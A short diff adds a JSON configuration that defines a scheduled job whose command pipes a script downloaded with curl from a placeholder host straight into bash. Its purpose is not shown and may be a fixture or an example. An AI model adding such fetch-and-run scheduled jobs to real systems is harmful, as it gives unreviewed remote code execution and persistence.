@@ -1,0 +1,4 @@
+{
+  "scheduled_job": true,
+  "command_line": "curl -s http://example.com/script.sh | bash"
+}
